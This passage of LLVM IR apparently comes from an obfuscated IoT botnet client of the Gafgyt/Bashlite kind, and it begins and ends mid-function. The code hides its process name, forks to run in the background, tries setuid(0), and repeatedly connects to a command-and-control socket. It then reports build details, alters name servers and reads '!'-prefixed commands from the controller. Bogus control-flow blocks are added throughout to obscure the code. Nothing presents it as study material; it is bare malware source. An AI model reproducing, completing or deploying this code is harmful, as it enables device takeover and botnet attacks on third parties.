  br i1 %68, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %69

; <label>:69:                                     ; preds = %originalBBpart28, %48
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %70 = alloca i16, align 2
  %71 = alloca i8*, align 8
  %72 = alloca i64, align 8
  %73 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.563, i32 0, i32 0), i32 513)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %70, align 2
  %75 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.563, i32 0, i32 0), i32 0) #5
  %76 = icmp ne i32 %75, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.564, i32 0, i32 0), i8** %10, align 8
  %77 = load i8*, i8** %10, align 8
  %78 = call i64 @strlen(i8* %77) #9
  store i64 %78, i64* %11, align 8
  %79 = load i16, i16* %9, align 2
  %80 = zext i16 %79 to i32
  %81 = load i8*, i8** %10, align 8
  %82 = load i64, i64* %11, align 8
  %83 = call i64 @write(i32 %80, i8* %81, i64 %82)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %49
  %84 = load i16, i16* %9, align 2
  %85 = zext i16 %84 to i32
  %86 = call i32 @close(i32 %85)
  br label %originalBB6
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.570, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.570, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.570, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %7, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %51

; <label>:48:                                     ; preds = %2
  %49 = load i32, i32* %7, align 4
  %50 = call i32 @waitpid(i32 %49, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:51:                                     ; preds = %2
  %52 = load i32, i32* %7, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %97, label %54

; <label>:54:                                     ; preds = %51
  %55 = load i32, i32* @x.93
  %56 = load i32, i32* @y.94
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %54
  %63 = call i32 @fork() #5
  store i32 %63, i32* %8, align 4
  %64 = icmp ne i32 %63, 0
  %65 = load i32, i32* @x.93
  %66 = load i32, i32* @y.94
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %64, label %73, label %90

; <label>:73:                                     ; preds = %originalBBpart2
  %74 = load i32, i32* @x.93
  %75 = load i32, i32* @y.94
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %73
  call void @exit(i32 0) #12
  %82 = load i32, i32* @x.93
  %83 = load i32, i32* @y.94
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:90:                                     ; preds = %originalBBpart2
  %91 = load i32, i32* %8, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %94, label %93

; <label>:93:                                     ; preds = %90
  br label %95

; <label>:94:                                     ; preds = %90
  br label %95

; <label>:95:                                     ; preds = %94, %93
  br label %96

; <label>:96:                                     ; preds = %95
  br label %98

; <label>:97:                                     ; preds = %51
  br label %98

; <label>:98:                                     ; preds = %97, %96
  br label %99

; <label>:99:                                     ; preds = %98
  %100 = load i32, i32* @x.93
  %101 = load i32, i32* @y.94
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %99
  %108 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.571, i32 0, i32 0)) #5
  %109 = call i32 @setuid(i32 0) #5
  %110 = call i32 @seteuid(i32 0) #5
  %111 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  %112 = load i32, i32* @x.93
  %113 = load i32, i32* @y.94
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %120

; <label>:120:                                    ; preds = %originalBBpart212, %originalBBpart28
  %121 = call i32 @fork() #5
  %122 = icmp eq i32 %121, 0
  br i1 %122, label %123, label %645

; <label>:123:                                    ; preds = %120
  %124 = call i32 @initConnection()
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %126, label %144

; <label>:126:                                    ; preds = %123
  %127 = load i32, i32* @x.93
  %128 = load i32, i32* @y.94
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %126
  %135 = call i32 @sleep(i32 5)
  %136 = load i32, i32* @x.93
  %137 = load i32, i32* @y.94
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %120

; <label>:144:                                    ; preds = %123
  %145 = load i32, i32* @mainCommSock, align 4
  %146 = call i8* @getBuild()
  %147 = call i32 @getEndianness()
  %148 = call i32 (i32, i8*, ...) @sockprintf(i32 %145, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.572, i32 0, i32 0), i8* %146, i32 %147)
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %149

; <label>:149:                                    ; preds = %643, %418, %318, %144
  %150 = load i32, i32* @mainCommSock, align 4
  %151 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %152 = call i32 @recvLine(i32 %150, i8* %151, i32 4096)
  store i32 %152, i32* %11, align 4
  %153 = icmp ne i32 %152, -1
  br i1 %153, label %154, label %644

; <label>:154:                                    ; preds = %149
  store i32 0, i32* %12, align 4
  br label %155

; <label>:155:                                    ; preds = %290, %154
  %156 = load i32, i32* %12, align 4
  %157 = sext i32 %156 to i64
  %158 = load i64, i64* @numpids, align 8
  %159 = icmp ult i64 %157, %158
  br i1 %159, label %160, label %293

; <label>:160:                                    ; preds = %155
  %161 = load i32*, i32** @pids, align 8
  %162 = load i32, i32* %12, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i32, i32* %161, i64 %163
  %165 = load i32, i32* %164, align 4
  %166 = call i32 @waitpid(i32 %165, i32* null, i32 1)
  %167 = icmp sgt i32 %166, 0
  br i1 %167, label %168, label %289

; <label>:168:                                    ; preds = %160
  %169 = load i32, i32* @x.93
  %170 = load i32, i32* @y.94
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %168
  %177 = load i32, i32* %12, align 4
  %178 = add nsw i32 %177, 1
  store i32 %178, i32* %14, align 4
  %179 = load i32, i32* @x.93
  %180 = load i32, i32* @y.94
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %187

; <label>:187:                                    ; preds = %originalBBpart231, %originalBBpart216
  %188 = load i32, i32* %14, align 4
  %189 = zext i32 %188 to i64
  %190 = load i64, i64* @numpids, align 8
  %191 = icmp ult i64 %189, %190
  br i1 %191, label %192, label %222

; <label>:192:                                    ; preds = %187
  %193 = load i32*, i32** @pids, align 8
  %194 = load i32, i32* %14, align 4
  %195 = zext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = load i32*, i32** @pids, align 8
  %199 = load i32, i32* %14, align 4
  %200 = sub i32 %199, 1
  %201 = zext i32 %200 to i64
  %202 = getelementptr inbounds i32, i32* %198, i64 %201
  store i32 %197, i32* %202, align 4
  br label %203

; <label>:203:                                    ; preds = %192
  %204 = load i32, i32* @x.93
  %205 = load i32, i32* @y.94
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %203
  %212 = load i32, i32* %14, align 4
  %213 = add i32 %212, 1
  store i32 %213, i32* %14, align 4
  %214 = load i32, i32* @x.93
  %215 = load i32, i32* @y.94
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart231, label %originalBB18alteredBB

originalBBpart231:                                ; preds = %originalBB18
  br label %187

; <label>:222:                                    ; preds = %187
  %223 = load i32, i32* @x.93
  %224 = load i32, i32* @y.94
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %222
  %231 = load i32*, i32** @pids, align 8
  %232 = load i32, i32* %14, align 4
  %233 = sub i32 %232, 1
  %234 = zext i32 %233 to i64
  %235 = getelementptr inbounds i32, i32* %231, i64 %234
  store i32 0, i32* %235, align 4
  %236 = load i64, i64* @numpids, align 8
  %237 = add i64 %236, -1
  store i64 %237, i64* @numpids, align 8
  %238 = load i64, i64* @numpids, align 8
  %239 = add i64 %238, 1
  %240 = mul i64 %239, 4
  %241 = call noalias i8* @malloc(i64 %240) #5
  %242 = bitcast i8* %241 to i32*
  store i32* %242, i32** %13, align 8
  store i32 0, i32* %14, align 4
  %243 = load i32, i32* @x.93
  %244 = load i32, i32* @y.94
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart263, label %originalBB33alteredBB

originalBBpart263:                                ; preds = %originalBB33
  br label %251

; <label>:251:                                    ; preds = %originalBBpart269, %originalBBpart263
  %252 = load i32, i32* %14, align 4
  %253 = zext i32 %252 to i64
  %254 = load i64, i64* @numpids, align 8
  %255 = icmp ult i64 %253, %254
  br i1 %255, label %256, label %285

; <label>:256:                                    ; preds = %251
  %257 = load i32*, i32** @pids, align 8
  %258 = load i32, i32* %14, align 4
  %259 = zext i32 %258 to i64
  %260 = getelementptr inbounds i32, i32* %257, i64 %259
  %261 = load i32, i32* %260, align 4
  %262 = load i32*, i32** %13, align 8
  %263 = load i32, i32* %14, align 4
  %264 = zext i32 %263 to i64
  %265 = getelementptr inbounds i32, i32* %262, i64 %264
  store i32 %261, i32* %265, align 4
  br label %266

; <label>:266:                                    ; preds = %256
  %267 = load i32, i32* @x.93
  %268 = load i32, i32* @y.94
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %266
  %275 = load i32, i32* %14, align 4
  %276 = add i32 %275, 1
  store i32 %276, i32* %14, align 4
  %277 = load i32, i32* @x.93
  %278 = load i32, i32* @y.94
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart269, label %originalBB65alteredBB

originalBBpart269:                                ; preds = %originalBB65
  br label %251

; <label>:285:                                    ; preds = %251
  %286 = load i32*, i32** @pids, align 8
  %287 = bitcast i32* %286 to i8*
  call void @free(i8* %287) #5
  %288 = load i32*, i32** %13, align 8
  store i32* %288, i32** @pids, align 8
  br label %289

; <label>:289:                                    ; preds = %285, %160
  br label %290

; <label>:290:                                    ; preds = %289
  %291 = load i32, i32* %12, align 4
  %292 = add nsw i32 %291, 1
  store i32 %292, i32* %12, align 4
  br label %155

; <label>:293:                                    ; preds = %155
  %294 = load i32, i32* @x.93
  %295 = load i32, i32* @y.94
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %293
  %302 = load i32, i32* %11, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %303
  store i8 0, i8* %304, align 1
  %305 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %305)
  %306 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %307 = call i8* @strstr(i8* %306, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.547, i32 0, i32 0)) #9
  %308 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %309 = icmp eq i8* %307, %308
  %310 = load i32, i32* @x.93
  %311 = load i32, i32* @y.94
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %309, label %318, label %319

; <label>:318:                                    ; preds = %originalBBpart273
  br label %149

; <label>:319:                                    ; preds = %originalBBpart273
  %320 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %321 = call i8* @strstr(i8* %320, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.573, i32 0, i32 0)) #9
  %322 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %323 = icmp eq i8* %321, %322
  br i1 %323, label %324, label %341

; <label>:324:                                    ; preds = %319
  %325 = load i32, i32* @x.93
  %326 = load i32, i32* @y.94
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %324
  call void @exit(i32 0) #12
  %333 = load i32, i32* @x.93
  %334 = load i32, i32* @y.94
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  unreachable

; <label>:341:                                    ; preds = %319
  %342 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %342, i8** %15, align 8
  %343 = load i8*, i8** %15, align 8
  %344 = load i8, i8* %343, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp eq i32 %345, 33
  br i1 %346, label %347, label %643

; <label>:347:                                    ; preds = %341
  %348 = load i32, i32* @x.93
  %349 = load i32, i32* @y.94
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %347
  %356 = load i8*, i8** %15, align 8
  %357 = getelementptr inbounds i8, i8* %356, i64 1
  store i8* %357, i8** %16, align 8
  %358 = load i32, i32* @x.93
  %359 = load i32, i32* @y.94
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %366

; <label>:366:                                    ; preds = %410, %originalBBpart281
  %367 = load i8*, i8** %16, align 8
  %368 = load i8, i8* %367, align 1
  %369 = zext i8 %368 to i32
  %370 = icmp ne i32 %369, 32
  br i1 %370, label %371, label %392

; <label>:371:                                    ; preds = %366
  %372 = load i32, i32* @x.93
  %373 = load i32, i32* @y.94
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %371
  %380 = load i8*, i8** %16, align 8
  %381 = load i8, i8* %380, align 1
  %382 = zext i8 %381 to i32
  %383 = icmp ne i32 %382, 0
  %384 = load i32, i32* @x.93
  %385 = load i32, i32* @y.94
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br label %392

; <label>:392:                                    ; preds = %originalBBpart285, %366
  %393 = phi i1 [ false, %366 ], [ %383, %originalBBpart285 ]
  %394 = load i32, i32* @x.93
  %395 = load i32, i32* @y.94
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %392
  %402 = load i32, i32* @x.93
  %403 = load i32, i32* @y.94
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br i1 %393, label %410, label %413

; <label>:410:                                    ; preds = %originalBBpart289
  %411 = load i8*, i8** %16, align 8
  %412 = getelementptr inbounds i8, i8* %411, i32 1
  store i8* %412, i8** %16, align 8
  br label %366

; <label>:413:                                    ; preds = %originalBBpart289
  %414 = load i8*, i8** %16, align 8
  %415 = load i8, i8* %414, align 1
  %416 = zext i8 %415 to i32
  %417 = icmp eq i32 %416, 0
  br i1 %417, label %418, label %419

; <label>:418:                                    ; preds = %413
  br label %149

; <label>:419:                                    ; preds = %413
  %420 = load i32, i32* @x.93
  %421 = load i32, i32* @y.94
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %419
  %428 = load i8*, i8** %16, align 8
  store i8 0, i8* %428, align 1
  %429 = load i8*, i8** %15, align 8
  %430 = getelementptr inbounds i8, i8* %429, i64 1
  store i8* %430, i8** %16, align 8
  %431 = load i8*, i8** %15, align 8
  %432 = load i8*, i8** %16, align 8
  %433 = call i64 @strlen(i8* %432) #9
  %434 = getelementptr inbounds i8, i8* %431, i64 %433
  %435 = getelementptr inbounds i8, i8* %434, i64 2
  store i8* %435, i8** %15, align 8
  %436 = load i32, i32* @x.93
  %437 = load i32, i32* @y.94
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br label %444

; <label>:444:                                    ; preds = %originalBBpart2110, %originalBBpart293
  %445 = load i32, i32* @x.93
  %446 = load i32, i32* @y.94
  %447 = sub i32 %445, 1
  %448 = mul i32 %445, %447
  %449 = urem i32 %448, 2
  %450 = icmp eq i32 %449, 0
  %451 = icmp slt i32 %446, 10
  %452 = or i1 %450, %451
  br i1 %452, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %444
  %453 = load i8*, i8** %15, align 8
  %454 = load i8*, i8** %15, align 8
  %455 = call i64 @strlen(i8* %454) #9
  %456 = sub i64 %455, 1
  %457 = getelementptr inbounds i8, i8* %453, i64 %456
  %458 = load i8, i8* %457, align 1
  %459 = zext i8 %458 to i32
  %460 = icmp eq i32 %459, 10
  %461 = load i32, i32* @x.93
  %462 = load i32, i32* @y.94
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBBpart2106, label %originalBB95alteredBB

originalBBpart2106:                               ; preds = %originalBB95
  br i1 %460, label %478, label %469

; <label>:469:                                    ; preds = %originalBBpart2106
  %470 = load i8*, i8** %15, align 8
  %471 = load i8*, i8** %15, align 8
  %472 = call i64 @strlen(i8* %471) #9
  %473 = sub i64 %472, 1
  %474 = getelementptr inbounds i8, i8* %470, i64 %473
  %475 = load i8, i8* %474, align 1
  %476 = zext i8 %475 to i32
  %477 = icmp eq i32 %476, 13
  br label %478

; <label>:478:                                    ; preds = %469, %originalBBpart2106
  %479 = phi i1 [ true, %originalBBpart2106 ], [ %477, %469 ]
  br i1 %479, label %480, label %502

; <label>:480:                                    ; preds = %478
  %481 = load i32, i32* @x.93
  %482 = load i32, i32* @y.94
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %480
  %489 = load i8*, i8** %15, align 8
  %490 = load i8*, i8** %15, align 8
  %491 = call i64 @strlen(i8* %490) #9
  %492 = sub i64 %491, 1
  %493 = getelementptr inbounds i8, i8* %489, i64 %492
  store i8 0, i8* %493, align 1
  %494 = load i32, i32* @x.93
  %495 = load i32, i32* @y.94
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br label %444

; <label>:502:                                    ; preds = %478
  %503 = load i32, i32* @x.93
  %504 = load i32, i32* @y.94
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %502
  %511 = load i8*, i8** %15, align 8
  store i8* %511, i8** %17, align 8
  %512 = load i32, i32* @x.93
  %513 = load i32, i32* @y.94
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %520

; <label>:520:                                    ; preds = %originalBBpart2118, %originalBBpart2114
  %521 = load i8*, i8** %15, align 8
  %522 = load i8, i8* %521, align 1
  %523 = zext i8 %522 to i32
  %524 = icmp ne i32 %523, 32
  br i1 %524, label %525, label %530

; <label>:525:                                    ; preds = %520
  %526 = load i8*, i8** %15, align 8
  %527 = load i8, i8* %526, align 1
  %528 = zext i8 %527 to i32
  %529 = icmp ne i32 %528, 0
  br label %530

; <label>:530:                                    ; preds = %525, %520
  %531 = phi i1 [ false, %520 ], [ %529, %525 ]
  br i1 %531, label %532, label %551

; <label>:532:                                    ; preds = %530
  %533 = load i32, i32* @x.93
  %534 = load i32, i32* @y.94
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %532
  %541 = load i8*, i8** %15, align 8
  %542 = getelementptr inbounds i8, i8* %541, i32 1
  store i8* %542, i8** %15, align 8
  %543 = load i32, i32* @x.93
  %544 = load i32, i32* @y.94
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %520

; <label>:551:                                    ; preds = %530
  %552 = load i8*, i8** %15, align 8
  store i8 0, i8* %552, align 1
  %553 = load i8*, i8** %15, align 8
  %554 = getelementptr inbounds i8, i8* %553, i32 1
  store i8* %554, i8** %15, align 8
  %555 = load i8*, i8** %17, align 8
  store i8* %555, i8** %18, align 8
  br label %556

